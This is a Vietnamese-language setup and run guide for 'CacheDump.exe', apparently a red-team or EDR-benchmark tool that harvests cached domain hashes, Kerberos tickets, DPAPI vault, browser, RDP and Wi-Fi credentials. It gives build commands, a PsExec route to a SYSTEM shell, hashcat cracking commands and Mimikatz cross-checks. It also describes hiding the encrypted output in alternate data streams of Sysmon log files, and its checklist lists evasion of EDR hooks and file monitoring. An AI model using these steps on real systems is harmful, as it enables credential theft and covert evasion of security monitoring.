# Plan 5 — Cached Domain Credentials: Hướng dẫn Setup & Chạy thử

> **Target**: T1003.005 — Cached Domain Credentials (Multi-Source)
> **Phương pháp**: Hybrid — Raw NTFS + LSA Memory + File System + Registry + WLAN API
> **Yêu cầu**: Administrator hoặc SYSTEM trên Windows workstation/server

---

## 1. Yêu cầu môi trường

| Thành phần | Yêu cầu |
|------------|---------|
| **OS** | Windows 10/11 hoặc Windows Server 2016+ |
| **Domain** | Domain-joined (cho MSCache v2 + Kerberos) |
| **Quyền** | Administrator hoặc SYSTEM |
| **Disk** | NTFS filesystem (cho raw hive reading) |
| **Compiler** | Visual Studio 2022 + Windows SDK 10.0.22621+ |
| **Python** | 3.8+ (cho verify script) |
| **Browser** | Chrome/Edge/Firefox đã lưu password (tùy chọn) |
| **RDP** | Đã lưu RDP credentials (tùy chọn) |
| **Wi-Fi** | Wireless adapter (tùy chọn) |

## 2. Cài đặt môi trường build

### 2.1 Visual Studio 2022

```powershell
winget install Microsoft.VisualStudio.2022.BuildTools --override `
    "--add Microsoft.VisualStudio.Workload.VCTools `
     --add Microsoft.VisualStudio.Component.Windows11SDK.22621 `
     --includeRecommended"
```

### 2.2 Setup test environment (tạo cached credentials)

```powershell
# 1. Domain login (tạo MSCache v2)
# Login vào domain account, sau đó logout → Windows cache credentials

# 2. Lưu Chrome password
# Mở Chrome → Settings → Passwords → lưu 1 vài test passwords

# 3. Lưu RDP credentials
cmdkey /add:TERMSRV/test-dc.testlab.local /user:testlab\testuser /pass:TestP@ss1!

# 4. Kết nối Wi-Fi
# Kết nối tới Wi-Fi network → Windows lưu profile

# 5. DPAPI Credential Manager
# Control Panel → Credential Manager → Add Windows Credential
```

---

## 3. Build

### 3.1 Build tự động

```powershell
cd D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan5_Cache
.\build.bat
```

Output: `CacheDump.exe`

### 3.2 Build thủ công

```powershell
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

cl.exe /nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 `
    /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE" `
    /Fe"CacheDump.exe" `
    src\main.c src\hive_reader.c src\lsass_reader.c `
    src\mscache_v2.c src\kerberos_cache.c src\dpapi_vault.c `
    src\dpapi_masterkey.c src\browser_creds.c src\rdp_creds.c `
    src\wifi_profiles.c src\ads_writer.c src\cleanup.c `
    src\crypto\sha256.c src\crypto\md5.c `
    src\crypto\rc4.c src\crypto\aes256_gcm.c src\crypto\dpapi.c `
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT `
    kernel32.lib ntdll.lib advapi32.lib crypt32.lib credui.lib
```

---

## 4. Setup môi trường test

### 4.1 Lấy Administrator shell

```powershell
# Chạy PowerShell với Administrator:
Start-Process powershell -Verb RunAs

# Hoặc lấy SYSTEM shell:
PsExec64.exe -s -i cmd.exe
```

### 4.2 Kiểm tra các nguồn credential

```powershell
# MSCache v2 (domain-joined only)
reg query HKLM\SECURITY\Cache

# Browser passwords
Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles"

# RDP saved
cmdkey /list | findstr TERMSRV

# Wi-Fi profiles
netsh wlan show profiles

# DPAPI Vault
Get-ChildItem "$env:APPDATA\Microsoft\Credentials"
Get-ChildItem "$env:APPDATA\Microsoft\Protect"
```

---

## 5. Chạy thử

### 5.1 Full multi-source dump

```powershell
# Chạy với Administrator:
.\CacheDump.exe
```

Output mong đợi:
```
==========================================================
  Cached Credential Dump — T1003.005
  Method: Multi-Source Hybrid (NTFS + Memory + File System)
==========================================================

[1/6] MSCache v2 (SECURITY\Cache)...
      Reading SECURITY hive via raw NTFS...
      [1] TESTLAB\Administrator ($DCC2$10240#Administrator#TESTLAB#AABB...)
      [2] TESTLAB\testuser ($DCC2$10240#testuser#TESTLAB#CCDD...)
      MSCache entries: 2

[2/6] Kerberos Ticket Cache (LSA Memory)...
      Kerberos tickets: 3

[3/6] DPAPI Credential Vault...
      DPAPI_SYSTEM key derived (64 bytes)
      [1] Administrator\TERMSRV/DC01 (domain_password)
      DPAPI credentials: 1

[4/6] Browser Password Stores...
      Users enumerated, found 5 passwords
      Browser passwords: 5

[5/6] RDP Saved Credentials...
      [1] TERMSRV/DC01.testlab.local (testlab\testuser)
      RDP entries: 2

[6/6] Wi-Fi Profiles...
      [1] CORP-WiFi (WPA2-PSK)
      [2] Guest-Network (Open)
      Wi-Fi profiles: 2

==========================================================
  Extraction Summary
==========================================================
  MSCache v2:     2 entries
  Kerberos TGT:   3 tickets
  DPAPI Vault:    1 credentials
  Browser:        5 passwords
  RDP:            2 connections
  Wi-Fi:          2 profiles
  ─────────────────────────────
  TOTAL:          15 cached credentials
==========================================================

[*] Serializing and encrypting output...
    Serialized: 18432 bytes
    ADS written: C:\Windows\System32\winevt\Logs\...\Sysmon.evtx:CacheDump
```

### 5.2 MSCache v2 only

```powershell
.\CacheDump.exe --mscache-only
```

### 5.3 Browser passwords only

```powershell
.\CacheDump.exe --browser-only
```

---

## 6. Verify kết quả

### 6.1 Đọc ADS output

```powershell
# Đọc dữ liệu từ ADS
$content = Get-Content "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx:CacheDump" -Raw
Write-Host "Output size: $($content.Length) bytes"
```

### 6.2 Chạy verify script

```powershell
cd test
python verify_cache.py
```

### 6.3 Crack MSCache v2 với hashcat

```powershell
# MSCache v2 = hashcat mode 2100
# Format: $DCC2$10240#username#domain#hash_hex
hashcat -m 2100 mscache_hashes.hashcat wordlist.txt --force
```

### 6.4 Cross-check từng nguồn

```powershell
# MSCache v2: so sánh với Mimikatz
# mimikatz # lsadump::cache

# Browser: mở Chrome → Settings → Passwords → kiểm tra thủ công

# RDP: kiểm tra Credential Manager
rundll32.exe keymgr.dll, KRShowKeyMgr

# Wi-Fi: so sánh với netsh
netsh wlan show profile name="CORP-WiFi" key=clear

# DPAPI: kiểm tra với Mimikatz
# mimikatz # dpapi::masterkey /in:...
```

---

## 7. Chạy test script tự động

```powershell
cd test

# Full test:
.\run_test.ps1

# MSCache only:
.\run_test.ps1 -MscacheOnly

# Browser only:
.\run_test.ps1 -BrowserOnly

# Skip EDR detection:
.\run_test.ps1 -SkipDetect
```

---

## 8. Cleanup

```powershell
# Xóa ADS
$targets = @(
    "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
    "C:\Windows\System32\winevt\Logs\Application.evtx",
    "C:\Windows\System32\LogFiles\HTTPERR\httperr1.log"
)
foreach ($t in $targets) {
    Remove-Item "$t`:CacheDump" -Force -EA SilentlyContinue
}

# Xóa test files
Remove-Item .\test\*.hashcat -Force -EA SilentlyContinue
Remove-Item .\output\* -Force -EA SilentlyContinue
```

---

## 9. Troubleshooting

| Lỗi | Nguyên nhân | Cách fix |
|-----|-------------|----------|
| `MSCache: 0 entries` | Không domain-joined hoặc chưa có cache | Login domain account + logout |
| `SKIPPED — LSASS not accessible` | EDR chặn hoặc PPL enabled | Thử handle dup fallback |
| `DPAPI_SYSTEM key not available` | Không đọc được SECURITY hive | Cần SYSTEM privilege |
| `Browser passwords: 0` | Không có browser hoặc Login Data trống | Lưu test password trong Chrome |
| `RDP entries: 0` | Không có RDP credentials đã lưu | `cmdkey /add:TERMSRV/...` |
| `Wi-Fi profiles: 0` | Không có wireless adapter | Chỉ hoạt động trên máy có Wi-Fi |
| `ADS write failed` | File target không tồn tại | Kiểm tra path file evtx/log |
| `Build FAILED` | Thiếu Visual Studio hoặc SDK | Cài VS2022 Build Tools |

---

## 10. Bypass Verification Checklist

- [ ] **MSCache v2 (raw NTFS)**: Đọc SECURITY hive không qua registry API → bypass `NtOpenKey` hooks
- [ ] **LSASS Memory (handle dup)**: Duplicate handle từ legitimate process → bypass ObRegisterCallbacks
- [ ] **DPAPI Vault (offline decrypt)**: Decrypt với DPAPI_SYSTEM backup key → không cần user password
- [ ] **Browser Login Data (in-memory)** : Copy SQLite DB vào memory → bypass file lock detection
- [ ] **Browser Password (DPAPI decrypt)**: Giải mã password_value với master key → không cần mở Chrome
- [ ] **RDP Credentials (CredEnumerate)**: Sử dụng Windows API chính thống → traffic bình thường
- [ ] **Wi-Fi (netsh XML)**: Sử dụng tool có sẵn của Windows → process creation bình thường
- [ ] **ADS Output**: Ghi vào ADS thay vì file mới → bypass file creation monitoring
- [ ] **AES-256-GCM Encryption**: Output mã hóa → nếu bị intercept, không đọc được plaintext

---

## 11. Kiến trúc hệ thống

```
┌──────────────────────────────────────────────────────────────┐
│                  CacheDump.exe (Administrator/SYSTEM)         │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐        │
│  │ MSCache v2   │  │ Kerberos     │  │ DPAPI Vault  │        │
│  │ SECURITY Hive│  │ LSA Memory   │  │ Credential   │        │
│  │ (Raw NTFS)   │  │ (Handle Dup) │  │ Manager      │        │
│  │              │  │              │  │ (Offline)    │        │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘        │
│         │                 │                 │                 │
│  ┌──────┴───────┐  ┌──────┴───────┐  ┌──────┴───────┐        │
│  │ Browser      │  │ RDP Saved    │  │ Wi-Fi        │        │
│  │ Chrome/Edge  │  │ TERMSRV/*    │  │ Profiles     │        │
│  │ Firefox      │  │ (Cred Mgmt)  │  │ (netsh)      │        │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘        │
│         │                 │                 │                 │
│         └─────────────────┼─────────────────┘                 │
│                           │                                   │
│                  ┌────────▼────────┐                          │
│                  │ Serialize       │                          │
│                  │ (Binary Format) │                          │
│                  └────────┬────────┘                          │
│                           │                                   │
│                  ┌────────▼────────┐                          │
│                  │ AES-256-GCM     │                          │
│                  │ Encrypt + ADS   │                          │
│                  └─────────────────┘                          │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

### Các nguồn credential

| # | Nguồn | Định dạng | Phương pháp | Hashcat Mode |
|---|-------|-----------|-------------|--------------|
| 1 | MSCache v2 | `$DCC2$10240#user#domain#hash` | SECURITY hive (raw NTFS) | 2100 |
| 2 | Kerberos TGT | `.kirbi` ticket file | LSA memory scan | N/A (Pass-the-Ticket) |
| 3 | DPAPI Vault | Plaintext credentials | Offline master key decrypt | N/A |
| 4 | Chrome/Edge | URL + username + password | SQLite in-memory parse | N/A |
| 5 | Firefox | URL + username + password | logins.json + key4.db | N/A |
| 6 | RDP | TERMSRV/host → username | Credential Manager API | N/A |
| 7 | Wi-Fi | SSID + PSK | netsh wlan export | 22000 (WPA-PMKID) |

### DPAPI Decryption Chain

```
┌─────────────────────────────────────────────────────────────┐
│ DPAPI Key Hierarchy:                                        │
│                                                              │
│ User Password                                                │
│     │                                                        │
│     ▼                                                        │
│ Master Key (Protect\{SID}\{GUID})                            │
│     │  encrypted with PBKDF2(user_password, salt, rounds)    │
│     │                                                        │
│     ├─── Decrypt với user password (cần interactive)         │
│     │                                                        │
│     └─── Decrypt với DPAPI_SYSTEM backup key (offline)       │
│              │                                                │
│              ▼                                                │
│         Master Key (64 bytes, decrypted)                     │
│              │                                                │
│              ▼                                                │
│         Credential Blob (Credentials\{GUID})                 │
│              │  encrypted with AES-256 / 3DES                 │
│              │                                                │
│              ▼                                                │
│         Plaintext Credential                                  │
│         (target name + username + password)                  │
└─────────────────────────────────────────────────────────────┘
```
